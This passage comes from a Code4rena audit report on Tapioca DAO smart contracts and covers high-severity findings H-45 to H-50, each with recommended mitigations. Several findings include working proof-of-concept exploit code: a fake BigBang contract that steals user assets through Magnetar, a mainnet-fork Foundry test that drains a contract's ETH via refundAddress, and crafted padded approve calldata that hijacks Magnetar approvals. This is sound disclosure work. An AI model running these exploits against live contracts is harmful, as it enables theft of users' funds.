    userCollateralShare:  99999999
    userCollateralShareToAmount:  0
    collateralPart in asset times exchangerRate 749999992500000000
    exchangeRate: 1000000000000000
    can borrow this much: 749
    748
          ✔ considers me solvent even when I have enough share for any amount PoCBorrow (12405ms)

In the scenario above, The deployer is adding share of collateral to the bigbang using `BigBang::addCollateral`. The added amount in the below example is (1e8 - 1), which is too small to get any collateral from the YieldBox, as the `yieldBox.toAmount` is zero.

However, due to the calculation error in the `Market::_isSolvent`, the deployer could borrow 748 of asset. Upon withdrawing the yieldBox will give zero amount of collateral, but the BigBang let the user borrow non zero amount of asset.

Similarly one can show that `Singularity` will liquidate less than it should, due to similar calculation error.

### details of the bug

The problem stems from the calculation error, where multiplies the user's collateral share with `EXCHANGE_RATE_PRECISION` and `collateralizationRate` before calling `yieldBox.toAmount`.
It will give inflated amount, resulting in false solvency.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L415-L421>

```solidity
        return
            yieldBox.toAmount(
                collateralId,
                collateralShare *
                    (EXCHANGE_RATE_PRECISION / FEE_PRECISION) *
                    collateralizationRate,
                false
            ) >=

```

The same calculation happens in the `Market::_computeMaxBorrowableAmount`

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L385-L399>

In the BigBang's liquidating logic (e.i. in the `BigBang::_updateBorrowAndCollateralShare`), the conversion from the share of collateral to the asset is calculated correctly:

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L781-L785>

```solidity
        uint256 collateralPartInAsset = (yieldBox.toAmount(
            collateralId,
            userCollateralShare[user],
            false
        ) * EXCHANGE_RATE_PRECISION) / _exchangeRate;
```

However, the position in question will not get to this logic, even if `BigBang::liquidate` is called on the position, since the `_isSolvent` will falsely consider the position as solvent.

Similarly the `Singularity` will overestimate the collateral in the same manner.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLiquidation.sol#L70-L90>

```solidity
    function _computeAssetAmountToSolvency(
        address user,
        uint256 _exchangeRate
    ) private view returns (uint256) {
        // accrue must have already been called!
        uint256 borrowPart = userBorrowPart[user];
        if (borrowPart == 0) return 0;
        uint256 collateralShare = userCollateralShare[user];

        Rebase memory _totalBorrow = totalBorrow;

        uint256 collateralAmountInAsset = yieldBox.toAmount(
            collateralId,
            (collateralShare *
                (EXCHANGE_RATE_PRECISION / FEE_PRECISION) *
                lqCollateralizationRate),
            false
        ) / _exchangeRate;
        // Obviously it's not `borrowPart` anymore but `borrowAmount`
        borrowPart = (borrowPart * _totalBorrow.elastic) / _totalBorrow.base;
```

### Recommended Mitigation Steps

The `Market::_isSolvent` and `Market::_computeMaxBorrowableAmount`  should evaluate the value of collateral like `BigBang::_updateBorrowAndCollateralShare` function, (e.i. calculate the exchangeRate and collateralizationRate after converting the share to asset).

<!-- zzzitron H-Market-isSolvent-PoCBorrow -->

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/915#issuecomment-1700227210)**

***

## [[H-46] TOFT leverageDown always fails if TOFT is a wrapper for native tokens](https://github.com/code-423n4/2023-07-tapioca-findings/issues/904)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/904)*

Pathway for [`sendForLeverage`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L323) -> [`leverageDown`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L480) always fails if the `TapiocaOFT` or `mTapiocaOFT` holds the native token as underlying, i.e. [`erc20 == address(0)`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFTStorage.sol#L28).
This results in loss of gas, airdropped amount, and burned TOFT on the sending side for the user.
The failed message if retried will always fail and result in permanent loss for the user.

### Proof of Concept

TapiocaOFT/mTapiocaOFT is deployed with [erc20 being address(0)](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol#L74) in case if it holds the native token as an underlying token.
However, it still allows anyone to execute the [`sendForLeverage`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L323) which always results in reverts when receiving the message.

The revert happens at [`IERC20(erc20).approve(externalData.swapper, amount);`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L215) since `address(0)` doesn't have an `approve` function.

The message if retried will just keep on reverting because of the same reason due to the way the `failedMessages` are stored, e.g. you can just retry the same exact payload.
This way anyone invoking this function will lose his TOFT tokens forever.

### Recommended Mitigation Steps

Disable [`sendForLeverage`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L323) function if the `TapiocaOFT` or `mTapiocaOFT` holds the native token as underlying, e.g. revert on the sending side.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/904#issuecomment-1700191812)**

***

## [[H-47] User's assets can be stolen when removing them from the Singularity market through the Magnetar contract](https://github.com/code-423n4/2023-07-tapioca-findings/issues/849)
*Submitted by [0xStalin](https://github.com/code-423n4/2023-07-tapioca-findings/issues/849), also found by [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/933)*

An Attacker can remove user's assets from Singularity Markets and steal them to an account of his own by abusing a vulnerability present in the Magnetar contract

### Proof of Concept

*   The [`Magnetar::exitPositionAndRemoveCollateral()`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L880-L904) can be used to exit from  tOB, unlock from tOLP, remove assets from Singularity markets, repay on BigBang markets, remove collateral from BigBang markets and withdraw, each of these steps are optional.

*   When users wants to execute any operation through the Magnetar contract, the Magnetar contracts requires to have the user's approvals/permissions, that means, when the Magnetar contract executes something on behalf of the user, the Magnetar contract have already been granted permission/allowance on the called contract on the user's behalf.

*   [When using the Magnetar contract to remove user assets from the Singularity market and use those assets to repay in a BigBang contract](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/modules/MagnetarMarketModule.sol#L568-L635), the Magnetar contract will receive the removed assets from the Singularity Market, grant ALL allowance to the BigBang contract in the YieldBox, and finally will call the BigBang.repay().

*   The problem is that none of the two markets are checked to ensure that they are valid and supported contracts by the Protocol.

*   This attack requires that an attacker creates a FakeBigBang contract (see Step 2 of the Coded PoC mini section!), and passes the address of this Fake BigBang contract as the address of the BigBang where the repayment will be done.
    *   When the execution is forwarded to the FakeBigBang contract, the Magnetar contract had already granted ALL allowance to this Fake contract in the YieldBox, which makes possible to do a `YieldBox.transfer()` from the Magnetar contract to an account owned by the attacker.
        *   The transferred assets from the Magnetar contract are the assets of the user that were removed from the Singularity market and that they were supposed to be used to repay the user's debt on the BigBang contract

### Coded PoC

*   I coded a PoC using the [`magnetar.test.ts`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/test/magnetar.test.ts) file as the base for this PoC.

1.  The first step is to add the `attacker` account in the [`test.utils.ts`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/test/test.utils.ts) file

```

    > git diff --no-index test.utils.ts testPoC.utils.ts

    diff --git a/test.utils.ts b/testPoC.utils.ts
    index 00fc388..83107e6 100755
    --- a/test.utils.ts
    +++ b/testPoC.utils.ts
    @@ -1023,8 +1023,14 @@ export async function register(staging?: boolean) {
             ethers.provider,
         );

    +    const attacker = new ethers.Wallet(
    +        ethers.Wallet.createRandom().privateKey,
    +        ethers.provider,
    +    );
    +
         if (!staging) {
             await setBalance(eoa1.address, 100000);
    +        await setBalance(attacker.address, 100000);
         }

         // ------------------- Deploy WethUSDC mock oracle -------------------
    @@ -1314,6 +1320,7 @@ export async function register(staging?: boolean) {

         if (!staging) {
             await setBalance(eoa1.address, 100000);
    +        await setBalance(attacker.address, 100000);
         }

         const initialSetup = {
    @@ -1341,6 +1348,7 @@ export async function register(staging?: boolean) {
             _sglLeverageModule,
             magnetar,
             eoa1,
    +        attacker,
             multiSwapper,
             singularityFeeTo,
             liquidationQueue,
```

2.  Now, let's create the `FakeBigBang` contract, make sure to create it under the [`tapioca-periph-audit/contract/`](https://github.com/Tapioca-DAO/tapioca-periph-audit/tree/023751a4e987cf7c203ab25d3abba58f7344f213/contracts) folder

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@boringcrypto/boring-solidity/contracts/libraries/BoringRebase.sol";

//YIELDBOX
import "tapioca-sdk/dist/contracts/YieldBox/contracts/YieldBox.sol";

import "./interfaces/IYieldBoxBase.sol";
import "./interfaces/IMarket.sol";

contract FakeBigBang {
  // using RebaseLibrary for Rebase;

  IMarket realSingularityMarket;

  IYieldBoxBase public yieldBox;
  
  /// @notice collateral token address
  address public collateral;
  /// @notice collateral token YieldBox id
  uint256 public collateralId;
  /// @notice asset token address
  address public asset;
  /// @notice asset token YieldBox id
  uint256 public assetId;

  uint256 public tOLPSglAssetId;

  address magnetarContract;
  
  function setMarket(address _realSingularityMarket) external {
    realSingularityMarket = IMarket(_realSingularityMarket);

    collateral = realSingularityMarket.collateral();
    collateralId = realSingularityMarket.collateralId();
    asset = realSingularityMarket.asset();
    assetId = realSingularityMarket.assetId();
    yieldBox = IYieldBoxBase(realSingularityMarket.yieldBox());
  }

  function setMagnetar(address _magnetar) external {
    magnetarContract = _magnetar;
  }


  //@audit => This is the function that will be called by the Magnetar contract
  //@audit => This contract will be granted all permission over the Mangetar contract in the YieldBox, which will allow it to transfer all that Magnetar owns to any address
  //@audit-info => repay() will transfer the singularity.assetId() from the YieldBox!
  function repay(
      address from,
      address to,
      bool skim,
      uint256 part
  ) external returns (uint256 amount) {

    uint magnetarAssetBalance = yieldBox.balanceOf(magnetarContract,assetId);
    yieldBox.transfer(magnetarContract, address(this), assetId, magnetarAssetBalance);

    amount = type(uint256).max; 
  }
}
```

</details>

3.  Create a new file to reproduce this PoC, magnetar_remove_assets_from_singularity_PoC.test.ts

*   Make sure to create this new test file under the [`tapioca-periph-audit/test/`](https://github.com/Tapioca-DAO/tapioca-periph-audit/tree/023751a4e987cf7c203ab25d3abba58f7344f213/test) folder

<details>

<!---->

    import { expect } from 'chai';
    import hre, { ethers, config } from 'hardhat';
    import { BN, register, getSGLPermitSignature } from './test.utils';
    import {
        loadFixture,
        takeSnapshot,
    } from '@nomicfoundation/hardhat-network-helpers';

    describe('MagnetarV2', () => {

        describe('repay', () => {
          it('should remove asset from Singularity and Attacker will steal those assets', async () => {
            const {
                weth,
                createWethUsd0Singularity,
                wethBigBangMarket,
                usd0,
                usdc,
                bar,
                wethAssetId,
                mediumRiskMC,
                deployCurveStableToUsdoBidder,
                initContracts,
                yieldBox,
                magnetar,
                deployer,
                attacker,
            } = await loadFixture(register);

            await initContracts();

            const usdoStratregy = await bar.emptyStrategies(usd0.address);
            const usdoAssetId = await yieldBox.ids(
                1,
                usd0.address,
                usdoStratregy,
                0,
            );
            const { stableToUsdoBidder } = await deployCurveStableToUsdoBidder(
                deployer,
                bar,
                usdc,
                usd0,
                false,
            );
            const { wethUsdoSingularity } = await createWethUsd0Singularity(
                deployer,
                usd0,
                weth,
                bar,
                usdoAssetId,
                wethAssetId,
                mediumRiskMC,
                yieldBox,
                stableToUsdoBidder,
                ethers.utils.parseEther('1'),
                false,
            );

            //@audit => Attacker deploys the FakeBigBang contract!
            const fakeBigBang = await ethers.deployContract("FakeBigBang");

            await fakeBigBang.setMarket(wethUsdoSingularity.address);  
            await fakeBigBang.setMagnetar(magnetar.address);

            const borrowAmount = ethers.BigNumber.from((1e18).toString()).mul(
                100,
            );
            const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(
                10,
            );

            await usd0.mint(deployer.address, borrowAmount.mul(2));
            // We get asset
            await weth.freeMint(wethMintVal);

            // Approve tokens
            // await approveTokensAndSetBarApproval();
            await yieldBox.setApprovalForAll(wethUsdoSingularity.address, true);
            await wethBigBangMarket.updateOperator(magnetar.address, true);
            await weth.approve(magnetar.address, wethMintVal);
            await wethUsdoSingularity.approve(
                magnetar.address,
                ethers.constants.MaxUint256,
            );
            await wethBigBangMarket.approveBorrow(
                magnetar.address,
                ethers.constants.MaxUint256,
            );

            await magnetar.mintFromBBAndLendOnSGL(
                deployer.address,
                borrowAmount,
                {
                    mint: true,
                    mintAmount: borrowAmount,
                    collateralDepositData: {
                        deposit: true,
                        amount: wethMintVal,
                        extractFromSender: true,
                    },
                },
                {
                    deposit: false,
                    amount: 0,
                    extractFromSender: false,
                },
                {
                    lock: false,
                    amount: 0,
                    lockDuration: 0,
                    target: ethers.constants.AddressZero,
                    fraction: 0,
                },
                {
                    participate: false,
                    target: ethers.constants.AddressZero,
                    tOLPTokenId: 0,
                },
                {
                    singularity: wethUsdoSingularity.address,
                    magnetar: magnetar.address,
                    bigBang: wethBigBangMarket.address,
                },
            );

            await usd0.approve(yieldBox.address, ethers.constants.MaxUint256);
            await yieldBox.depositAsset(
                usdoAssetId,
                deployer.address,
                deployer.address,
                borrowAmount,
                0,
            );
            const wethCollateralBefore =
                await wethBigBangMarket.userCollateralShare(deployer.address);
            const fraction = await wethUsdoSingularity.balanceOf(
                deployer.address,
            );

            const assetId = await wethUsdoSingularity.assetId();
            
            console.log("asset in YieldBox owned by Magnetar - BEFORE: ", await yieldBox.balanceOf(magnetar.address,assetId));
            console.log("asset in YieldBox owned by User - BEFORE: ", await yieldBox.balanceOf(deployer.address,assetId));
            console.log("asset in YieldBox owned by FakeBigBang - BEFORE: ", await yieldBox.balanceOf(fakeBigBang.address,assetId));

            //@audit => magnetar contract already has been approved by the deployer contract to perform the removed asset operation in the Singularity Market
            //@audit => The `attacker` executed the attack over the `deployer` address
            //@audit => attacker will remove assets from the deployer in the Singularity market, and will transfer those assets to an account of his own by using a FakeBigBang contract!
            await magnetar.connect(attacker).exitPositionAndRemoveCollateral(
                deployer.address,
                {
                    magnetar: magnetar.address,
                    singularity: wethUsdoSingularity.address,
                    // bigBang: wethBigBangMarket.address,
                    bigBang: fakeBigBang.address,
                },
                {
                    removeAssetFromSGL: true,
                    removeShare: fraction.div(2),
                    repayAssetOnBB: true,
                    repayAmount: await yieldBox.toAmount(
                        usdoAssetId,
                        fraction.div(3),
                        false,
                    ),
                    removeCollateralFromBB: false,
                    collateralShare: 0,
                    exitData: {
                        exit: false,
                        oTAPTokenID: 0,
                        target: ethers.constants.AddressZero,
                    },
                    unlockData: {
                        unlock: false,
                        target: ethers.constants.AddressZero,
                        tokenId: 0,
                    },
                    assetWithdrawData: {
                        withdraw: false,
                        withdrawAdapterParams: ethers.utils.toUtf8Bytes(''),
                        withdrawLzChainId: 0,
                        withdrawLzFeeAmount: 0,
                        withdrawOnOtherChain: false,
                    },
                    collateralWithdrawData: {
                        withdraw: false,
                        withdrawAdapterParams: ethers.utils.toUtf8Bytes(''),
                        withdrawLzChainId: 0,
                        withdrawLzFeeAmount: 0,
                        withdrawOnOtherChain: false,
                    },
                },
            );
            console.log("\n\n=======================================================================\n\n");
            console.log("asset in YieldBox owned by Magnetar - AFTER: ", await yieldBox.balanceOf(magnetar.address,assetId));
            console.log("asset in YieldBox owned by User - AFTER: ", await yieldBox.balanceOf(deployer.address,assetId));
            console.log("asset in YieldBox owned by FakeBigBang - AFTER: ", await yieldBox.balanceOf(fakeBigBang.address,assetId));

          });
        });

    });

</details>

4.  After all the 3 previous steps have been completed, everything is ready to run the PoC.

> npx hardhat test magnetar_remove_assets_from_singularity_PoC.test.ts

      MagnetarV2
        repay
    asset in YieldBox owned by Magnetar - BEFORE:  BigNumber { value: "0" }
    asset in YieldBox owned by User - BEFORE:  BigNumber { value: "10000000000000000000000000000" }
    asset in YieldBox owned by FakeBigBang - BEFORE:  BigNumber { value: "0" }


    =======================================================================


    asset in YieldBox owned by Magnetar - AFTER:  BigNumber { value: "0" }
    asset in YieldBox owned by User - AFTER:  BigNumber { value: "10000000000000000000000000000" }
    asset in YieldBox owned by FakeBigBang - AFTER:  BigNumber { value: "5000000000000000000000000000" }
          ✔ should remove asset from Singularity and Attacker will steal those assets (14114ms)

### Recommended Mitigation Steps

*   Use the Penrose contract to validate that the provided markets as parameters are real markets supported by the protocol (Both, BB & Singularity markets)
*   Add the below checks on the [`_exitPositionAndRemoveCollateral()`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/modules/MagnetarMarketModule.sol#L495-L675) function

```solidity
function _exitPositionAndRemoveCollateral(
    address user,
    ICommonData.ICommonExternalContracts calldata externalData,
    IUSDOBase.IRemoveAndRepay calldata removeAndRepayData
) private {
+   require(penrose.isMarketRegistered(externalData.bigBang), "BigBang market is not a valid market supported by the protocol");
+   require(penrose.isMarketRegistered(externalData.singularity), "Singularity market is not a valid market supported by the protocol");

    IMarket bigBang = IMarket(externalData.bigBang);
    ISingularity singularity = ISingularity(externalData.singularity);
    IYieldBoxBase yieldBox = IYieldBoxBase(singularity.yieldBox());

    ...
    ...
    ...
}
```

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/849#issuecomment-1700164092)**

***

## [[H-48] triggerSendFrom() will send all the ETH in the destination chain where sendFrom() is called to the refundAddress in the LzCallParams argument](https://github.com/code-423n4/2023-07-tapioca-findings/issues/836)
*Submitted by [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/836)*

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L99> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L551> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L142> 

<https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/token/oft/v2/BaseOFTV2.sol#L18>

All the ETH in the destination chain where `sendFrom()` is called is sent to the `refundAddress` in the `LzCallParams`. Thus, for `TapiocaOFT`s which have ETH as the underlying asset `erc`, all the funds will be lost if the `refundAddress` is an address other than the `TapiocaOFT`.

### Proof of Concept

`sendFrom()` uses the `msg.value` as native fees to LayerZero, being the excess sent refunded to the `refundAddress`. In `BaseTOFTOptionsModule`, `sendFromDestination()`, which is called when there was a `triggerSendFrom()` from a source chain which is delivered to the current chain, the value sent to the `sendFrom()` function is `address(this).balance`:

    function sendFromDestination(bytes memory _payload) public {
        ...
        ISendFrom(address(this)).sendFrom{value: address(this).balance}(
            from,
            lzDstChainId,
            LzLib.addressToBytes32(from),
            amount,
            callParams
        );
        ...
    }

This means that all the balance but the LayerZero message fee will be refunded to the `refundAddress` in the `callParams`, as can be seen in the `sendFrom()` function:

```solidity
    function sendFrom(address _from, uint16 _dstChainId, bytes32 _toAddress, uint _amount, LzCallParams calldata _callParams) public payable virtual override {
        _send(_from, _dstChainId, _toAddress, _amount, _callParams.refundAddress, _callParams.zroPaymentAddress, _callParams.adapterParams);
    }
```

The following POC shows that a user that specifies the `refundAddress` as its address will receive all the ETH balance in the `TapiocaOFT` contract minus the LayerZero message fee.

<details>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";

import {TapiocaOFT} from "contracts/tOFT/TapiocaOFT.sol";
import {BaseTOFTOptionsModule} from "contracts/tOFT/modules/BaseTOFTOptionsModule.sol";

import {IYieldBoxBase} from "tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";
import {ISendFrom} from "tapioca-periph/contracts/interfaces/ISendFrom.sol";
import {ICommonData} from "tapioca-periph/contracts/interfaces/ICommonData.sol";

contract TapiocaOFTPOC is Test {
    address public constant LZ_ENDPOINT =
        0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    uint16 public constant PT_SEND_FROM = 778;

    function test_POC_TriggerSendFrom_StealAllEth() public {
        vm.createSelectFork("https://eth.llamarpc.com");

        address optionsModule_ = address(new BaseTOFTOptionsModule(address(LZ_ENDPOINT), address(0), IYieldBoxBase(address(2)), "SomeName", "SomeSymbol", 18, block.chainid));

        TapiocaOFT tapiocaOft_ = new TapiocaOFT(
            LZ_ENDPOINT,
            address(0),
            IYieldBoxBase(address(3)),
            "SomeName",
            "SomeSymbol",
            18,
            block.chainid,
            payable(address(1)),
            payable(address(2)),
            payable(address(3)),
            payable(optionsModule_)
        );

        address user_ = makeAddr("user");
        deal(user_, 2 ether);
        deal(address(tapiocaOft_), 10 ether);
        vm.prank(user_);
        tapiocaOft_.wrap{value: 1 ether}(user_, user_, 1 ether);

        uint16 lzDstChainId_ = 102;
        bytes memory airdropAdapterParams_;
        address zroPaymentAddress_ = address(0);
        uint256 amount_ = 1;
        ISendFrom.LzCallParams memory sendFromData_;
        sendFromData_.refundAddress = payable(user_);
        ICommonData.IApproval[] memory approvals_;

        tapiocaOft_.setTrustedRemoteAddress(102, abi.encodePacked(tapiocaOft_));

        // triggerSendFrom goes through with refundAddress = user_ in the SendFrom call in the destination chain
        vm.prank(user_);
        tapiocaOft_.triggerSendFrom{value: 1 ether}(
            lzDstChainId_,
            airdropAdapterParams_,
            zroPaymentAddress_,
            amount_,
            sendFromData_,
            approvals_
        );

        bytes memory lzPayload_ = abi.encode(
            PT_SEND_FROM,
            user_,
            amount_,
            sendFromData_,
            102,
            approvals_
        );

        vm.prank(user_);
        tapiocaOft_.approve(address(tapiocaOft_), amount_); // user has to approve the tOFT contract to spend their tokens in the SendFrom call

        vm.prank(LZ_ENDPOINT);
        tapiocaOft_.lzReceive(102, abi.encodePacked(tapiocaOft_, tapiocaOft_), 0, lzPayload_);
        assertGt(user_.balance, 10 ether); // user received the whole balance of the tOFT contract due to the refund
    }
}
```

</details>

### Tools Used

Vscode, Foundry

### Recommended Mitigation Steps

The value sent in the `sendFrom()` call in the `BaseTOFTOptionsModule` should be sent and forwarded from the `triggerSendFrom()` call in the source chain. This way, the user pays the fees from the source chain.

**[0xRektora (Tapioca) confirmed and commented](https://github.com/code-423n4/2023-07-tapioca-findings/issues/836#issuecomment-1700159958):**
 > Good finding. Technically speaking the `sendFrom()` will fail if the call was made to the host chain, the one holding the Ether, since LZ have a limit to the amount of value you can send between chain, but nonetheless valid.

**[LSDan (Judge) decreased severity to Medium](https://github.com/code-423n4/2023-07-tapioca-findings/issues/836#issuecomment-1737845380)**
 
**[0x73696d616f (Warden) commented](https://github.com/code-423n4/2023-07-tapioca-findings/issues/836#issuecomment-1743684027):**
 > Hi everyone,
> 
> This issue should be a valid high as there is no limit on the ETH transferred.
> The ETH is sent to the attacker (or normal user) on the refund of the LayerZero UltraLightNodeV2, [here](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/UltraLightNodeV2.sol#L154), in the source chain where `sendFrom()` is called, not in the destination chain.
> The only cross chain transaction required for this exploit is the `triggerSendFrom()`, which sends no ETH to the chain where `sendFrom()` is called.
> Thus, the ETH is not actually sent as a cross chain transaction, but sent directly as a refund in the source chain (see the test in the POC) where `sendFrom()` is called, not having any limit.
> 
> Kindly request a review from the judge.

**[LSDan (Judge) increase severity to High and commented](https://github.com/code-423n4/2023-07-tapioca-findings/issues/836#issuecomment-1748625302):**
 > Thank you for the clarification. You are correct. This is a valid high risk issue.

***

## [[H-49] User can give himself approval for all assets held by `MagnetarV2` contract](https://github.com/code-423n4/2023-07-tapioca-findings/issues/832)
*Submitted by [0xTheC0der](https://github.com/code-423n4/2023-07-tapioca-findings/issues/832), also found by [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/927) and [dirk\_y](https://github.com/code-423n4/2023-07-tapioca-findings/issues/352)*

When calling [MagnetarV2.\_permit(...)](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L1025-L1049) through invoking a permit (or permit all) action via [MagnetarV2.burst(...)](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L192-L715), one can also execute other calls than `ERC20.permit(...)` due to the following reasons / under the following constraints:

*   The `target` address can be chosen freely, can be any contract, asset, token, NFT, etc.
*   The function selector in `actionCalldata` is not checked, i.e. not required to be `ERC20.permit(...)`
*   The first parameter in the encoded `actionCalldata` [**must** be equal to `msg.sender`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L1036)
*   The length of the `actionCalldata` should match the length of an encoded call to `ERC20.permit(...)` to avoid issues on [`abi.decode(...)`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L1032-L1035)

Given this information, an attacker can easily craft calls to give him approval for any assets held by the `MagnetarV2` contract or directly invoke a transfer. There are potentially other malicious calls that can be crafted and executed via the permit action, therefore the mentioned approve/transfer calls are only an example.

In order for this to cause loss of funds for the DAO, the `MagnetarV2` contract needs to hold (be the owner of) assets in the first place which seems likely since it is a main entry point and interacts with other important parts of the protocol like Singularity, BigBang, TapiocaOptionBroker and MagnetarMarketModule [(trough `delegatecall` in some cases)](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L1064-L1075).

### Proof of Concept

The following PoC is based on an existing test case and demonstrates that an attacker can give himself the approval of the `MagnetarV2` contract for an ERC20 token.

Just apply the *diff* below in `tapioca-periph-audit` and run the test case with `npx hardhat test test/magnetar.test.ts`:

<details>

```diff
diff --git a/test/magnetar.test.ts b/test/magnetar.test.ts
index 63d108e..f32659d 100644
--- a/test/magnetar.test.ts
+++ b/test/magnetar.test.ts
@@ -439,7 +439,7 @@ describe('MagnetarV2', () => {
     });
 
     describe('permits', () => {
-        it('should test an array of permits', async () => {
+        it.only('approve via permit action', async () => {
             const { deployer, eoa1, magnetar } = await loadFixture(register);
 
             const name = 'Token One';
@@ -486,39 +486,38 @@ describe('MagnetarV2', () => {
             );
             const signature = signTypedMessage(privateKey, { data });
             const { v, r, s } = fromRpcSig(signature);
-
+            
+            // Original permit calldata: user/deployer gives approval about value to eo1 
             const permitEncodedFnData = tokenOne.interface.encodeFunctionData(
                 'permit',
                 [deployer.address, eoa1.address, value, MAX_DEADLINE, v, r, s],
             );
+            
+            // Crafted approve calldata: magnetar gives approval about value to user/deployer
+            const approveEncodedFnData = tokenOne.interface.encodeFunctionData(
+                'approve',
+                [deployer.address, value],
+            );
+            
+            // Pad approve calldata to length of permit calldata, otherwise magnetar reverts when decoding
+            const approveEncodedFnDataPadded = approveEncodedFnData.padEnd(permitEncodedFnData.length, '0');
 
             await magnetar.connect(deployer).burst([
                 {
-                    id: 2,
+                    id: 2,      // PERMIT
                     target: tokenOne.address,
                     value: 0,
                     allowFailure: false,
-                    call: permitEncodedFnData,
+                    call: approveEncodedFnDataPadded, // provide padded approval calldata
                 },
             ]);
 
+            // Check if approval was successful
             const allowance = await tokenOne.allowance(
+                magnetar.address,
                 deployer.address,
-                eoa1.address,
             );
             expect(allowance.eq(value)).to.be.true;
-
-            await expect(
-                magnetar.connect(deployer).burst([
-                    {
-                        id: 2,
-                        target: tokenOne.address,
-                        value: 0,
-                        allowFailure: false,
-                        call: permitEncodedFnData,
-                    },
-                ]),
-            ).to.be.reverted;
         });
     });
```

</details>

### Tools Used

VS Code, Hardhat

### Recommended Mitigation Steps

Require the function selector (first 4 bytes of `actionCalldata`) to match an `ERC*.permit(...)` call in [MagnetarV2.\_permit(...)](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L1025-L1049).

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/832#issuecomment-1699903298)**

***

## [[H-50] CompoundStrategy attempts to transfer out a greater amount of ETH than will actually be withdrawn, leading to DoS](https://github.com/code-423n4/2023-07-tapioca-findings/issues/674)
*Submitted by [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/674)*

Withdrawals will revert whenever there is not sufficient wrapped native tokens to cover loss from integer truncation.

### Proof of Concept

`CompoundStrategy._withdraw` calculates the amount of cETH to redeem with `cToken.exchangeRateStored` based on a provided amount of ETH to receive from the withdrawal.

```solidity
function _withdraw(
	address to,
	uint256 amount
) internal override nonReentrant {
	uint256 available = _currentBalance();
	require(available >= amount, "CompoundStrategy: amount not valid");

	uint256 queued = wrappedNative.balanceOf(address(this));
	if (amount > queued) {
		uint256 pricePerShare = cToken.exchangeRateStored();
		uint256 toWithdraw = (((amount - queued) * (10 ** 18)) /
			pricePerShare);

		cToken.redeem(toWithdraw);
```

To understand the vulnerability, we look at the `CEther` contract which we are attempting to withdraw from.

```solidity
/**
 * @notice Sender redeems cTokens in exchange for the underlying asset
 * @dev Accrues interest whether or not the operation succeeds, unless reverted
